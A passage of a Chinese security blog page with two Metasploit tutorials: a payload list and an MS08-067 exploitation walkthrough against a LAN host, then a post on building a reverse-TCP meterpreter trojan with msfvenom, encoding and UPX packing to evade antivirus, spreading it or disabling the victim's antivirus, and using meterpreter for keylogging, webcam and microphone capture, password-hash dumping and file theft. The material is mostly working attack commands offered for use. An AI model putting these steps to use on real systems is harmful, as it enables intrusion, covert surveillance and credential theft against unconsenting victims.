  windows/dllinject/reverse_ipv6_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (IPv6)
  windows/dllinject/reverse_nonx_tcp                                   normal  Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
  windows/dllinject/reverse_ord_tcp                                    normal  Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
  windows/dllinject/reverse_tcp                                        normal  Reflective DLL Injection, Reverse TCP Stager
  windows/dllinject/reverse_tcp_allports                               normal  Reflective DLL Injection, Reverse All-Port TCP Stager
  windows/dllinject/reverse_tcp_dns                                    normal  Reflective DLL Injection, Reverse TCP Stager (DNS)
  windows/dllinject/reverse_tcp_rc4                                    normal  Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption)
  windows/dllinject/reverse_tcp_uuid                                   normal  Reflective DLL Injection, Reverse TCP Stager with UUID Support
  windows/dllinject/reverse_winhttp                                    normal  Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)
  windows/dns_txt_query_exec                                           normal  DNS TXT Record Payload Download and Execution
  windows/exec                                                         normal  Windows Execute Command
  windows/format_all_drives                                            manual  Windows Drive Formatter
  windows/loadlibrary                                                  normal  Windows LoadLibrary Path
  windows/messagebox                                                   normal  Windows MessageBox
  windows/meterpreter/bind_hidden_ipknock_tcp                          normal  Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
  windows/meterpreter/bind_hidden_tcp                                  normal  Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
  windows/meterpreter/bind_ipv6_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
  windows/meterpreter/bind_ipv6_tcp_uuid                               normal  Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
  windows/meterpreter/bind_nonx_tcp                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
  windows/meterpreter/bind_tcp                                         normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
  windows/meterpreter/bind_tcp_rc4                                     normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption)
  windows/meterpreter/bind_tcp_uuid                                    normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
  windows/meterpreter/reverse_hop_http                                 normal  Windows Meterpreter (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
  windows/meterpreter/reverse_http                                     normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
  windows/meterpreter/reverse_https                                    normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
  windows/meterpreter/reverse_https_proxy                              normal  Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager with Support for Custom Proxy
  windows/meterpreter/reverse_ipv6_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
  windows/meterpreter/reverse_nonx_tcp                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
  windows/meterpreter/reverse_ord_tcp                                  normal  Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
  windows/meterpreter/reverse_tcp                                      normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager
  windows/meterpreter/reverse_tcp_allports                             normal  Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
  windows/meterpreter/reverse_tcp_dns                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
  windows/meterpreter/reverse_tcp_rc4                                  normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption)
  windows/meterpreter/reverse_tcp_uuid                                 normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
  windows/meterpreter/reverse_winhttp                                  normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
  windows/meterpreter/reverse_winhttps                                 normal  Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)
  windows/metsvc_bind_tcp                                              normal  Windows Meterpreter Service, Bind TCP
  windows/metsvc_reverse_tcp                                           normal  Windows Meterpreter Service, Reverse TCP Inline
  windows/patchupdllinject/bind_hidden_ipknock_tcp                     normal  Windows Inject DLL, Hidden Bind Ipknock TCP Stager
  windows/patchupdllinject/bind_hidden_tcp                             normal  Windows Inject DLL, Hidden Bind TCP Stager
  windows/patchupdllinject/bind_ipv6_tcp                               normal  Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)
  windows/patchupdllinject/bind_ipv6_tcp_uuid                          normal  Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)
  windows/patchupdllinject/bind_nonx_tcp                               normal  Windows Inject DLL, Bind TCP Stager (No NX or Win7)
  windows/patchupdllinject/bind_tcp                                    normal  Windows Inject DLL, Bind TCP Stager (Windows x86)
  windows/patchupdllinject/bind_tcp_rc4                                normal  Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption)
  windows/patchupdllinject/bind_tcp_uuid                               normal  Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)
  windows/patchupdllinject/reverse_ipv6_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (IPv6)
  windows/patchupdllinject/reverse_nonx_tcp                            normal  Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
  windows/patchupdllinject/reverse_ord_tcp                             normal  Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
  windows/patchupdllinject/reverse_tcp                                 normal  Windows Inject DLL, Reverse TCP Stager
  windows/patchupdllinject/reverse_tcp_allports                        normal  Windows Inject DLL, Reverse All-Port TCP Stager
  windows/patchupdllinject/reverse_tcp_dns                             normal  Windows Inject DLL, Reverse TCP Stager (DNS)
  windows/patchupdllinject/reverse_tcp_rc4                             normal  Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption)
  windows/patchupdllinject/reverse_tcp_uuid                            normal  Windows Inject DLL, Reverse TCP Stager with UUID Support
  windows/patchupmeterpreter/bind_hidden_ipknock_tcp                   normal  Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager
  windows/patchupmeterpreter/bind_hidden_tcp                           normal  Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager
  windows/patchupmeterpreter/bind_ipv6_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)
  windows/patchupmeterpreter/bind_ipv6_tcp_uuid                        normal  Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
  windows/patchupmeterpreter/bind_nonx_tcp                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)
  windows/patchupmeterpreter/bind_tcp                                  normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)
  windows/patchupmeterpreter/bind_tcp_rc4                              normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption)
  windows/patchupmeterpreter/bind_tcp_uuid                             normal  Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)
  windows/patchupmeterpreter/reverse_ipv6_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)
  windows/patchupmeterpreter/reverse_nonx_tcp                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)
  windows/patchupmeterpreter/reverse_ord_tcp                           normal  Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)
  windows/patchupmeterpreter/reverse_tcp                               normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
  windows/patchupmeterpreter/reverse_tcp_allports                      normal  Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
  windows/patchupmeterpreter/reverse_tcp_dns                           normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
  windows/patchupmeterpreter/reverse_tcp_rc4                           normal  Windows   Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption)
  windows/patchupmeterpreter/reverse_tcp_uuid                          normal  Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
  windows/shell/bind_hidden_ipknock_tcp                                normal  Windows Command Shell, Hidden Bind Ipknock TCP Stager
  windows/shell/bind_hidden_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Stager
  windows/shell/bind_ipv6_tcp                                          normal  Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)
  windows/shell/bind_ipv6_tcp_uuid                                     normal  Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)
  windows/shell/bind_nonx_tcp                                          normal  Windows Command Shell, Bind TCP Stager (No NX or Win7)
  windows/shell/bind_tcp                                               normal  Windows Command Shell, Bind TCP Stager (Windows x86)
  windows/shell/bind_tcp_rc4                                           normal  Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption)
  windows/shell/bind_tcp_uuid                                          normal  Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
  windows/shell/reverse_ipv6_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (IPv6)
  windows/shell/reverse_nonx_tcp                                       normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)
  windows/shell/reverse_ord_tcp                                        normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
  windows/shell/reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Stager
  windows/shell/reverse_tcp_allports                                   normal  Windows Command Shell, Reverse All-Port TCP Stager
  windows/shell/reverse_tcp_dns                                        normal  Windows Command Shell, Reverse TCP Stager (DNS)
  windows/shell/reverse_tcp_rc4                                        normal  Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption)
  windows/shell/reverse_tcp_uuid                                       normal  Windows Command Shell, Reverse TCP Stager with UUID Support
  windows/shell_bind_tcp                                               normal  Windows Command Shell, Bind TCP Inline
  windows/shell_hidden_bind_tcp                                        normal  Windows Command Shell, Hidden Bind TCP Inline
  windows/shell_reverse_tcp                                            normal  Windows Command Shell, Reverse TCP Inline
  windows/speak_pwned                                                  normal  Windows Speech API - Say &quot;You Got Pwned!&quot;
  windows/upexec/bind_hidden_ipknock_tcp                               normal  Windows Upload/Execute, Hidden Bind Ipknock TCP Stager
  windows/upexec/bind_hidden_tcp                                       normal  Windows Upload/Execute, Hidden Bind TCP Stager
  windows/upexec/bind_ipv6_tcp                                         normal  Windows Upload/Execute, Bind IPv6 TCP Stager (Windows x86)
  windows/upexec/bind_ipv6_tcp_uuid                                    normal  Windows Upload/Execute, Bind IPv6 TCP Stager with UUID Support (Windows x86)
   windows/upexec/bind_nonx_tcp                                         normal  Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
  windows/upexec/bind_tcp                                              normal  Windows Upload/Execute, Bind TCP Stager (Windows x86)
  windows/upexec/bind_tcp_rc4                                          normal  Windows Upload/Execute, Bind TCP Stager (RC4 Stage Encryption)
  windows/upexec/bind_tcp_uuid                                         normal  Windows Upload/Execute, Bind TCP Stager with UUID Support (Windows x86)
  windows/upexec/reverse_ipv6_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (IPv6)
  windows/upexec/reverse_nonx_tcp                                      normal  Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
  windows/upexec/reverse_ord_tcp                                       normal  Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
  windows/upexec/reverse_tcp                                           normal  Windows Upload/Execute, Reverse TCP Stager
  windows/upexec/reverse_tcp_allports                                  normal  Windows Upload/Execute, Reverse All-Port TCP Stager
  windows/upexec/reverse_tcp_dns                                       normal  Windows Upload/Execute, Reverse TCP Stager (DNS)
  windows/upexec/reverse_tcp_rc4                                       normal  Windows Upload/Execute, Reverse TCP Stager (RC4 Stage Encryption)
  windows/upexec/reverse_tcp_uuid                                      normal  Windows Upload/Execute, Reverse TCP Stager with UUID Support
  windows/vncinject/bind_hidden_ipknock_tcp                            normal  VNC Server (Reflective Injection), Hidden Bind Ipknock TCP Stager
  windows/vncinject/bind_hidden_tcp                                    normal  VNC Server (Reflective Injection), Hidden Bind TCP Stager
  windows/vncinject/bind_ipv6_tcp                                      normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
  windows/vncinject/bind_ipv6_tcp_uuid                                 normal  VNC Server (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
  windows/vncinject/bind_nonx_tcp                                      normal  VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
  windows/vncinject/bind_tcp                                           normal  VNC Server (Reflective Injection), Bind TCP Stager (Windows x86)
  windows/vncinject/bind_tcp_rc4                                       normal  VNC Server (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption)
  windows/vncinject/bind_tcp_uuid                                      normal  VNC Server (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
  windows/vncinject/reverse_hop_http                                   normal  VNC Server (Reflective Injection), Reverse Hop HTTP/HTTPS Stager
  windows/vncinject/reverse_http                                       normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (wininet)
  windows/vncinject/reverse_ipv6_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
  windows/vncinject/reverse_nonx_tcp                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
  windows/vncinject/reverse_ord_tcp                                    normal  VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
  windows/vncinject/reverse_tcp                                        normal  VNC Server (Reflective Injection), Reverse TCP Stager
  windows/vncinject/reverse_tcp_allports                               normal  VNC Server (Reflective Injection), Reverse All-Port TCP Stager
  windows/vncinject/reverse_tcp_dns                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (DNS)
  windows/vncinject/reverse_tcp_rc4                                    normal  VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption)
  windows/vncinject/reverse_tcp_uuid                                   normal  VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support
  windows/vncinject/reverse_winhttp                                    normal  VNC Server (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
</code></pre></li>
<li><p>8.设置载荷</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcp

payload =&gt; windows/meterpreter/reverse_tcp
</code></pre><h3 id="这个载荷要么背下要么记得是什么，能找到也行"><a href="#这个载荷要么背下要么记得是什么，能找到也行" class="headerlink" title="这个载荷要么背下要么记得是什么，能找到也行"></a>这个载荷要么背下要么记得是什么，能找到也行</h3></li>
<li><p>9.设置本地IP地址</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; set LHOST 192.168.43.236

LHOST =&gt; 192.168.43.236
</code></pre><h3 id="查看配置信息"><a href="#查看配置信息" class="headerlink" title="查看配置信息"></a>查看配置信息</h3><pre><code>msf exploit(ms08_067_netapi) &gt; show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.43.176   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</code></pre></li>
</ul>
<pre><code>Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread,   process, none)
   LHOST     192.168.43.236   yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
</code></pre><ul>
<li><p>10.查看和设置目标版本ID</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows 2003 SP0 Universal
   4   Windows XP SP2 English (AlwaysOn NX)
   5   Windows XP SP2 English (NX)
   6   Windows XP SP3 English (AlwaysOn NX)
   7   Windows XP SP3 English (NX)
   8   Windows XP SP2 Arabic (NX)
   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
   10  Windows XP SP2 Chinese - Simplified (NX)
   11  Windows XP SP2 Chinese - Traditional (NX)
   12  Windows XP SP2 Czech (NX)
   13  Windows XP SP2 Danish (NX)
   14  Windows XP SP2 German (NX)
   15  Windows XP SP2 Greek (NX)
   16  Windows XP SP2 Spanish (NX)
   17  Windows XP SP2 Finnish (NX)
   18  Windows XP SP2 French (NX)
   19  Windows XP SP2 Hebrew (NX)
   20  Windows XP SP2 Hungarian (NX)
   21  Windows XP SP2 Italian (NX)
   22  Windows XP SP2 Japanese (NX)
   23  Windows XP SP2 Korean (NX)
   24  Windows XP SP2 Dutch (NX)
   25  Windows XP SP2 Norwegian (NX)
   26  Windows XP SP2 Polish (NX)
   27  Windows XP SP2 Portuguese - Brazilian (NX)
   28  Windows XP SP2 Portuguese (NX)
   29  Windows XP SP2 Russian (NX)
   30  Windows XP SP2 Swedish (NX)
   31  Windows XP SP2 Turkish (NX)
   32  Windows XP SP3 Arabic (NX)
   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
   34  Windows XP SP3 Chinese - Simplified (NX)
   35  Windows XP SP3 Chinese - Traditional (NX)
   36  Windows XP SP3 Czech (NX)
   37  Windows XP SP3 Danish (NX)
   38  Windows XP SP3 German (NX)
   39  Windows XP SP3 Greek (NX)
   40  Windows XP SP3 Spanish (NX)
   41  Windows XP SP3 Finnish (NX)
   42  Windows XP SP3 French (NX)
   43  Windows XP SP3 Hebrew (NX)
   44  Windows XP SP3 Hungarian (NX)
   45  Windows XP SP3 Italian (NX)
   46  Windows XP SP3 Japanese (NX)
   47  Windows XP SP3 Korean (NX)
   48  Windows XP SP3 Dutch (NX)
   49  Windows XP SP3 Norwegian (NX)
   50  Windows XP SP3 Polish (NX)
   51  Windows XP SP3 Portuguese - Brazilian (NX)
   52  Windows XP SP3 Portuguese (NX)
   53  Windows XP SP3 Russian (NX)
   54  Windows XP SP3 Swedish (NX)
   55  Windows XP SP3 Turkish (NX)
   56  Windows 2003 SP1 English (NO NX)
   57  Windows 2003 SP1 English (NX)
   58  Windows 2003 SP1 Japanese (NO NX)
   59  Windows 2003 SP1 Spanish (NO NX)
   60  Windows 2003 SP1 Spanish (NX)
   61  Windows 2003 SP1 French (NO NX)
   62  Windows 2003 SP1 French (NX)
   63  Windows 2003 SP2 English (NO NX)
   64  Windows 2003 SP2 English (NX)
   65  Windows 2003 SP2 German (NO NX)
   66  Windows 2003 SP2 German (NX)
   67  Windows 2003 SP2 Portuguese - Brazilian (NX)
   68  Windows 2003 SP2 Spanish (NO NX)
   69  Windows 2003 SP2 Spanish (NX)
   70  Windows 2003 SP2 Japanese (NO NX)
   71  Windows 2003 SP2 French (NO NX)
   72  Windows 2003 SP2 French (NX)
</code></pre></li>
</ul>
<hr>
<h3 id="设置target-ID"><a href="#设置target-ID" class="headerlink" title="设置target ID"></a>设置target ID</h3><pre><code>msf exploit(ms08_067_netapi) &gt; set target 17

target =&gt; 11
</code></pre><ul>
<li><p>11.再一次确认配置信息是否设置完成</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.43.176   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</code></pre></li>
</ul>
<pre><code>Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread,   process, none)
   LHOST     192.168.43.236   yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   11  Windows XP SP2 Chinese - Traditional (NX)
</code></pre><ul>
<li><p>12.开始进攻</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; exploit
</code></pre></li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit远程控制木马/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/Metasploit远程控制木马/" class="post-title-link" itemprop="url">Metasploit远程控制木马</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:05:30 / 修改时间：06:06:19" itemprop="dateCreated datePublished" datetime="2019-01-14T06:05:30+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="Metasploit远程控制软件，及木马的使用"><a href="#Metasploit远程控制软件，及木马的使用" class="headerlink" title="Metasploit远程控制软件，及木马的使用"></a>Metasploit远程控制软件，及木马的使用</h1></blockquote>
<blockquote>
<h5 id="基础小知识：木马：-1-控制端（控制程序）-2-服务端（木马程序）so-要进行木马攻击必须要先根据自己的IP生成一个木马"><a href="#基础小知识：木马：-1-控制端（控制程序）-2-服务端（木马程序）so-要进行木马攻击必须要先根据自己的IP生成一个木马" class="headerlink" title="基础小知识：木马：- 1.   控制端（控制程序）   - 2.服务端（木马程序）so 要进行木马攻击必须要先根据自己的IP生成一个木马"></a>基础小知识：木马：- 1.   控制端（控制程序）   - 2.服务端（木马程序）so 要进行木马攻击必须要先根据自己的IP生成一个木马</h5></blockquote>
<ul>
<li><p>1.打开终端，输入</p>
<pre><code>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.43.80 LPORT=55555 X &gt; test.exe
</code></pre><h5 id="‘X’-—-以二进制显示出来"><a href="#‘X’-—-以二进制显示出来" class="headerlink" title="‘X’ —-以二进制显示出来"></a>‘X’ —-以二进制显示出来</h5><h5 id="‘-gt-’-—-“写”的意思"><a href="#‘-gt-’-—-“写”的意思" class="headerlink" title="‘&gt;’    —-“写”的意思"></a>‘&gt;’    —-“写”的意思</h5><h6 id="生成一个木马程序test-exe"><a href="#生成一个木马程序test-exe" class="headerlink" title="生成一个木马程序test.exe"></a>生成一个木马程序test.exe</h6><ul>
<li>更新了kali了，现在已经没有msfpayload的命令了，换成msfvenom了。里面集成了msfpayload和msfencode</li>
<li><p>kali2.0之后的可以使用以下命令</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=192.168.1.113 LPORT=443 -f exe &gt; abc.exe
// -p payload
-e 编码方式
-i 编码次数
-b 在生成的程序中避免出现的值
LHOST,LPORT 监听上线的主机IP和端口
-f exe 生成EXE格式
</code></pre><ul>
<li><p>还可以使用UPX加壳，做免杀处理，命令如下</p>
<p>   upx -5 /root/Desktop/acn.exe</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>2.将生成的木马程序发布出去，在根目录下找到即可。现在杀毒软件会发现并将其隔离，如果不想被发现，可以做免杀处理，如果不想做免杀处理，把目标机的杀毒软件关掉就可以拖进去了</p>
</li>
</ul>
<ul>
<li><p>3.打开另一个终端，输入</p>
<pre><code>msfconsole
</code></pre><h5 id="启动metasploit"><a href="#启动metasploit" class="headerlink" title="启动metasploit"></a>启动metasploit</h5></li>
<li><p>4.在msf下输入</p>
<pre><code>use exploit/multi/handler
</code></pre></li>
<li><p>5.查看需要设置的参数</p>
<pre><code>show options
</code></pre></li>
<li><p>6.设置payload</p>
<pre><code>set PAYLOAD windows/meterpreter/reverse_tcp
</code></pre><h5 id="使用这个shellcode程序"><a href="#使用这个shellcode程序" class="headerlink" title="使用这个shellcode程序"></a>使用这个shellcode程序</h5></li>
<li><p>7.查看参数设置</p>
<pre><code>show options
</code></pre></li>
<li><p>8.设置LHOST，LPORT</p>
<pre><code>set LHOST 192.168.43.80
set LPORT 55555
</code></pre></li>
<li><p>9.执行程序</p>
<pre><code>exploit
</code></pre><h5 id="生成一个等待连接会话，等待有人点击木马程序，当被攻击者点击之后生成"><a href="#生成一个等待连接会话，等待有人点击木马程序，当被攻击者点击之后生成" class="headerlink" title="生成一个等待连接会话，等待有人点击木马程序，当被攻击者点击之后生成"></a>生成一个等待连接会话，等待有人点击木马程序，当被攻击者点击之后生成</h5><pre><code>meterpreter &gt;
</code></pre><h5 id="这样一个等待输入的状态，可以进行一系列邪恶的操作"><a href="#这样一个等待输入的状态，可以进行一系列邪恶的操作" class="headerlink" title="这样一个等待输入的状态，可以进行一系列邪恶的操作"></a>这样一个等待输入的状态，可以进行一系列邪恶的操作</h5><h5 id="例如查看系统"><a href="#例如查看系统" class="headerlink" title="例如查看系统"></a>例如查看系统</h5><pre><code>meterpreter &gt; sysinfo
</code></pre><h5 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h5><pre><code>meterpreter &gt; shell
</code></pre></li>
</ul>
<blockquote>
<h4 id="先执行msf，后执行木马，如何使用工具"><a href="#先执行msf，后执行木马，如何使用工具" class="headerlink" title="先执行msf，后执行木马，如何使用工具"></a>先执行msf，后执行木马，如何使用工具</h4></blockquote>
<pre><code>help      //查看帮助
</code></pre><ul>
<li><p>1.将自己暂时不用的会话放在后台</p>
<pre><code>background
</code></pre><h5 id="如何返回刚才的会话"><a href="#如何返回刚才的会话" class="headerlink" title="如何返回刚才的会话"></a>如何返回刚才的会话</h5><pre><code>sessions -l         //查看会话
sessions -i 1       //选择刚才的会话，数字‘1’视情况而定
</code></pre></li>
<li><p>2.进程注入（木马随时有可能被结束掉）</p>
<pre><code>meterpreter &gt; ps        //得到要注入的PID进程
</code></pre><h5 id="经过查看得到桌面管理进程：2036-2004-explorer-exe"><a href="#经过查看得到桌面管理进程：2036-2004-explorer-exe" class="headerlink" title="经过查看得到桌面管理进程：2036 2004 explorer.exe"></a>经过查看得到桌面管理进程：2036 2004 explorer.exe</h5><pre><code>meterpreter &gt; migrate 2036     //注入
</code></pre></li>
<li><p>3.远程桌面的开启</p>
<pre><code>meterpreter &gt; run vuc
</code></pre></li>
<li><p>4.系统文件管理功能</p>
<pre><code>meterpreter &gt; XXXXXX

XXXXXX          //功能

download        //下载文件
edit            //编辑文件(vim编辑器的使用)
cat             //查看文件
mkdir           //创建文件
mv              //移动文件
rm              //删除文件
upload          //上传文件
rmdir           //删除文件夹
</code></pre></li>
</ul>
<blockquote>
<h5 id="vim编辑器的使用：’i’-开始编辑-—esc键：退出编辑状态—-shift-：并输入wq（保存并退出）"><a href="#vim编辑器的使用：’i’-开始编辑-—esc键：退出编辑状态—-shift-：并输入wq（保存并退出）" class="headerlink" title="vim编辑器的使用：’i’ 开始编辑   —esc键：退出编辑状态—-shift+：并输入wq（保存并退出）"></a>vim编辑器的使用：’i’ 开始编辑   —esc键：退出编辑状态—-shift+：并输入wq（保存并退出）</h5></blockquote>
<ul>
<li><p>5.网络和系统操作</p>
<pre><code>meterpreter &gt; XXXXX

XXXXX          //功能

arp            //看arp缓冲表
ifconfig       //看IP地址及网卡
getproxy       //获取代理
netstat ·      //查看端口链接

kill  +代号    //结束进程（ps查看）
ps             //查看进程
reboot         //重启电脑
reg            //修改注册表
shell          //获取shell
shutdown       //关闭电脑
sysinfo        //获取电脑信息
</code></pre></li>
</ul>
<ul>
<li><p>6.用户接口操作及摄像头操作</p>
<pre><code>meterpreter &gt; XXXXXX

XXXXXX              //功能
enumdesktops        //用户登录数
keyscan_start       //键盘记录开始(第一步)
keyscan_dump        //键盘记录下载(第二步)
keyscan_stop        //键盘记录停止(第三步)
uictl               //获取键盘鼠标控制权(使用方法加“-h”查看)
record_mic          //音频录制(-d 可以自己设置时间长短，默认1秒)
webcam_chat         //查看摄像头接口
webcam_list         //查看摄像头列表
webcam_stream       //摄像头视频获取
getsystem           //获取高权限
hashdump            //下载hash密文
</code></pre><h5 id="如何用命令行查看视频与音频文件"><a href="#如何用命令行查看视频与音频文件" class="headerlink" title="如何用命令行查看视频与音频文件"></a>如何用命令行查看视频与音频文件</h5><pre><code>apt-get install mplayer
mplayer XXXXXX(播放文件)
</code></pre></li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
